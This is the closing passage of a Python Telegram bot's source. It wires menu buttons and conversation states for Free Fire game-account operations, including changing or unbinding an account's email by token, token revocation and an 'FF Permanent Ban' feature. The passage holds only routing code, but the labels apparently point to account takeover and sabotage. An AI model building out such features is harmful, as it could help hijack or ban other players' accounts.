    elif text == "💀 FF Permanent Ban":
        return await ff_ban_start(update, context)
    elif text == "📧 Resubscribe OTP":
        return await resubscribe_start(update, context)
    elif text == "🔍 Check Platform":
        return await platform_start(update, context)
    elif text == "💀 Check Ban":
        return await ban_check_start(update, context)
    elif text == "👑 Owner Info":
        await owner_info(update, context)
        return ConversationHandler.END
    elif text == "🌐 EAT Website":
        await eat_website_info(update, context)
        return ConversationHandler.END
    return ConversationHandler.END

def main():
    print("🚀 ZEVRIC V66 FINAL - Subscribe.py Exact Logic - Resubscribe + Ban Check + FF Ban Same Work")
    app=Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", force_start), group=0)
    conv = ConversationHandler(
        entry_points=[
            MessageHandler(filters.Regex("Bind Info Check"), check_info_start),
            MessageHandler(filters.Regex("Bind Email"), bind_email_start),
            MessageHandler(filters.Regex("Change Bind Email"), change_email_start),
            MessageHandler(filters.Regex("Unbind Email"), unbind_email_start),
            MessageHandler(filters.Regex("Cancel Request"), cancel_bind_start),
            MessageHandler(filters.Regex("EAT to Token"), eat_to_token_start),
            MessageHandler(filters.Regex("Revoke Token"), revoke_token_start),
            MessageHandler(filters.Regex("Update Bio"), bio_start),
            MessageHandler(filters.Regex("FF Permanent Ban"), ff_ban_start),
            MessageHandler(filters.Regex("Resubscribe OTP"), resubscribe_start),
            MessageHandler(filters.Regex("Check Platform"), platform_start),
            MessageHandler(filters.Regex("Check Ban"), ban_check_start),
        ],
        states={
            CHECK_INFO: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, check_info_token)],
            BIND_TOKEN: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_token)],
            BIND_EMAIL: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_email)],
            BIND_OTP: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_otp)],
            BIND_SEC: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bind_email_security_code)],
            CHANGE_TOKEN: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_token)],
            CHANGE_OTP_OLD: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_otp_old)],
            CHANGE_NEW: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_new)],
            CHANGE_OTP_NEW: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_otp_new)],
            CHANGE_CONFIRM: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, change_email_confirm)],
            UNBIND_TOKEN: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_token)],
            UNBIND_OTP: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_otp)],
            UNBIND_CONFIRM: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, unbind_email_confirm)],
            CANCEL_TOKEN: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, cancel_bind_token)],
            CANCEL_CONFIRM: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, cancel_bind_confirm)],
            EAT_INPUT: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, eat_to_token_convert)],
            REVOKE_TOKEN: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, revoke_token_verify)],
            REVOKE_CONFIRM: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, revoke_token_confirm)],
            BIO_TOKEN: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_token)],
            BIO_TEXT: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_text)],
            BIO_COLOR: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_color)],
            BIO_CONFIRM: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, bio_confirm)],
            FF_BAN_TOKEN: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, ff_ban_token)],
            FF_BAN_CONFIRM: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, ff_ban_confirm)],
            RESUB_EMAIL: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, resubscribe_email)],
            PLATFORM_TOKEN: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, platform_token)],
            BAN_CHECK_UID: [MessageHandler(filters.Regex("Bind Info Check|Bind Email|Change Bind Email|Unbind Email|Cancel Request|EAT to Token|Revoke Token|Update Bio|FF Permanent Ban|Resubscribe OTP|Check Platform|Check Ban|Owner Info|EAT Website"), switch_menu), MessageHandler(filters.TEXT & ~filters.COMMAND, ban_check_uid)],
        },
        fallbacks=[CommandHandler("start", force_start)],
        conversation_timeout=600,
        allow_reentry=True
    )
    app.add_handler(conv)
    app.add_handler(CommandHandler("start", start))
    print("✅ V66 FINAL - Subscribe.py Exact Logic - 14 Features - Single Message Flow")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)

if __name__=="__main__": main()
